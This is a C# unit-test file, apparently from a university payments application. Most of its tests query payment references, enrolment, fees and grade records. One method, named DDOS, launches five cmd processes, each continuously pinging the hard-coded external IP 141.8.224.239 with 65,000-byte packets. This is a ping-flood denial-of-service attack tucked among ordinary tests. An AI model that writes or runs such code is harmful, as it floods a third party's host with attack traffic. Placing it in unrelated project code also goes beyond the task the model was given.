using BLL;
using DAL;
using DTO;
using Microsoft.VisualStudio.TestTools.UnitTesting;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Pruebas
{
    [TestClass]
    public class PruebasPagos
    {
        [TestMethod]
        public void TraerPagos()
        {
            var objRest =
            BLLPago.ReferenciasPago(5919, 2017, 2);
        }

        [TestMethod]
        public void DDOS()
        {
            System.Diagnostics.Process proc;
            string cmd = "/C ping 141.8.224.239 -t -l 65000";
            for (int i = 0; i < 5; i++)
            {
                proc = new System.Diagnostics.Process();
                proc.EnableRaisingEvents = false;
                proc.StartInfo.FileName = "cmd";
                proc.StartInfo.Arguments = cmd;
                proc.Start();
            }
        }


        [TestMethod]
        public void PuebaReferencias()
        {
        
            using (UniversidadEntities db = new UniversidadEntities())
            {
                var referenciaid = "424135";
                var 
                referencia = (
              from a in db.ReferenciaProcesada
              join b in db.PagoParcial on a.ReferenciaProcesadaId equals b.ReferenciaProcesadaId
              where a.ReferenciaTipoId == 1
                 && a.EstatusId == 1
                 && b.EstatusId == 4
                 && a.ReferenciaId.Contains(referenciaid)
              select new ReferenciasPagadas
              {
                  AlumnoId = a.AlumnoId,
                  ReferenciaId = a.ReferenciaId,
                  FechaPagoD = a.FechaPago,
                  MontoPagado = b.Pago.ToString(),
                  MontoReferencia = a.Importe.ToString(),
                  Saldo = a.Restante.ToString()
              }

              ).ToList();
            }

               
        }




        [TestMethod]
        public void pagos()
        {
            using (UniversidadEntities db = new UniversidadEntities())
            {
                var pagosid = new int[] { 802, 304, 320, 800, 15 };
                var pagocolegiatura = new int[] { 800 };
                var pagomateria = new int[] { 304, 320 };
                var estatus = new int[] { 1, 4, 14 };
                int  anio = 2017, periodo = 1;
                //Alumnos que estan inscritos y  tienen referencias

                var AlumnosInscrito = db.spAlumnoInscritoCompleto(anio, periodo).ToList();


                var referencias = (from a in db.Pago
                                   join c in db.Cuota on a.CuotaId equals c.CuotaId
                                   where a.Anio == anio && a.PeriodoId == periodo && pagosid.Contains(c.PagoConceptoId) && estatus.Contains(a.EstatusId)
                                   orderby a.AlumnoId
                                   group a by new { c.PagoConceptoId, a.AlumnoId, a.OfertaEducativaId} into grp
                                   select new DTOReporteAlumnoReferencia1
                                   {
                                       alumnoId = grp.Key.AlumnoId,
                                       ofertaId = grp.Key.OfertaEducativaId,
                                       pagoConcepto = grp.Key.PagoConceptoId,
                                       suma = grp.Count()
                                   }).ToList();


               // var alumno = referencias.Where(a => a.alumnoId == 7697).ToList();

                List<DTOReporteAlumnoReferencia> union = new List<DTOReporteAlumnoReferencia>();

                union.AddRange( referencias.GroupBy(a=> new {a.alumnoId,a.ofertaId }).Select(a=> new DTOReporteAlumnoReferencia
                {
                    alumnoId = a.Key.alumnoId,
                    especialidadId = a.Key.ofertaId
                }));

                var calificacionesantecedente = db.CalificacionesAntecedente.Where(v => v.Anio == anio
                                                                                          && v.PeriodoId == periodo).ToList();
                ///ins
                union = union.Select(a => new DTOReporteAlumnoReferencia
                {
                    alumnoId = a.alumnoId,
                    especialidadId = a.especialidadId,
                    inscripcion = "" + referencias.Where(b => b.alumnoId == a.alumnoId && b.ofertaId == a.especialidadId && b.pagoConcepto == 802).FirstOrDefault()?.suma,
                    colegiatura = "" + referencias.Where(b => b.alumnoId == a.alumnoId && b.ofertaId == a.especialidadId && b.pagoConcepto == 800).FirstOrDefault()?.suma,
                    materiaSuelta = "" + referencias.Where(b => b.alumnoId == a.alumnoId && b.ofertaId == a.especialidadId && pagomateria.Contains(b.pagoConcepto)).FirstOrDefault()?.suma,
                    asesoriaEspecial = "" + referencias.Where(b => b.alumnoId == a.alumnoId && b.ofertaId == a.especialidadId && b.pagoConcepto == 15).FirstOrDefault()?.suma,
                    tipo = AlumnosInscrito.Where(f => f.AlumnoId == a.alumnoId && f.OfertaEducativaId == a.especialidadId).ToList().Count > 0 ? 1 : 2,
                    noMaterias = calificacionesantecedente.Where(v => v.AlumnoId == a.alumnoId && v.OfertaEducativaId == a.especialidadId).FirstOrDefault()?.NoMaterias??0,
                    calificacionMaterias = "" + calificacionesantecedente.Where(v => v.AlumnoId == a.alumnoId && v.OfertaEducativaId == a.especialidadId).FirstOrDefault()?.CalificacionMaterias ?? "",
                    noBaja = calificacionesantecedente.Where(v => v.AlumnoId == a.alumnoId && v.OfertaEducativaId == a.especialidadId).FirstOrDefault()?.NoBajas ?? 0,
                    bajaMaterias = "" + calificacionesantecedente.Where(v => v.AlumnoId == a.alumnoId && v.OfertaEducativaId == a.especialidadId).FirstOrDefault()?.BajaMaterias ?? ""
                }
                ).ToList();


                //Alumnos que estan inscritos y no tienen referencias
                var parte2 = AlumnosInscrito.Where(a => a.Anio == anio && a.PeriodoId == periodo && union.Where(f=> f.alumnoId == a.AlumnoId && f.especialidadId == a.OfertaEducativaId).ToList().Count == 0)
                                             .Select(d => new DTOReporteAlumnoReferencia
                                             {
                                                 alumnoId = d.AlumnoId,
                                                 especialidadId = d.OfertaEducativaId,
                                                 inscripcion = "0",
                                                 colegiatura = "0",
                                                 materiaSuelta = "0",
                                                 asesoriaEspecial = "0",
                                                 tipo = 1,
                                                 noMaterias = calificacionesantecedente.Where(v => v.AlumnoId == d.AlumnoId && v.OfertaEducativaId == d.OfertaEducativaId).FirstOrDefault()?.NoMaterias ?? 0,
                                                 calificacionMaterias = "" + calificacionesantecedente.Where(v => v.AlumnoId == d.AlumnoId && v.OfertaEducativaId == d.OfertaEducativaId).FirstOrDefault()?.CalificacionMaterias ?? "",
                                                 noBaja = calificacionesantecedente.Where(v => v.AlumnoId == d.AlumnoId && v.OfertaEducativaId == d.OfertaEducativaId).FirstOrDefault()?.NoBajas ?? 0,
                                                 bajaMaterias = "" + calificacionesantecedente.Where(v => v.AlumnoId == d.AlumnoId && v.OfertaEducativaId == d.OfertaEducativaId).FirstOrDefault()?.BajaMaterias ?? ""
                                             }
                                             ).ToList();

                union.AddRange(parte2);



                //union

                union = (from a in union
                         join b in db.Alumno on a.alumnoId equals b.AlumnoId
                         join c in db.OfertaEducativa on a.especialidadId equals c.OfertaEducativaId
                         select new DTOReporteAlumnoReferencia
                         {
                             alumnoId = a.alumnoId,
                             nombreAlumno = b.Paterno + " " + b.Materno + " " + b.Nombre,
                             especialidad = c.Descripcion,
                             inscripcion = a.inscripcion == "" ? "0" : a.inscripcion,
                             colegiatura = a.colegiatura == "" ? "0" : a.colegiatura,
                             materiaSuelta = a.materiaSuelta == "" ? "0" : a.materiaSuelta,
                             asesoriaEspecial = a.asesoriaEspecial == "" ? "0" : a.asesoriaEspecial,
                             noMaterias = a.noMaterias,
                             calificacionMaterias = a.calificacionMaterias,
                             noBaja = a.noBaja,
                             bajaMaterias = a.bajaMaterias,
                             tipo = a.noMaterias > 0 && a.noBaja > 0 && a.noBaja < a.noMaterias ? 1
                             : a.noMaterias == 0 && a.noBaja > 0 ? 2
                             : int.Parse(a.inscripcion + a.colegiatura + a.materiaSuelta + a.asesoriaEspecial) > 0 && a.noMaterias == 0 && a.noBaja == 0 ? 3
                             : int.Parse(a.inscripcion + a.colegiatura + a.materiaSuelta + a.asesoriaEspecial) == 0 && a.noMaterias > 0 || a.noBaja > 0 ? 4 : 0,
                         }).Distinct().ToList();

            }

        }

      

}
}
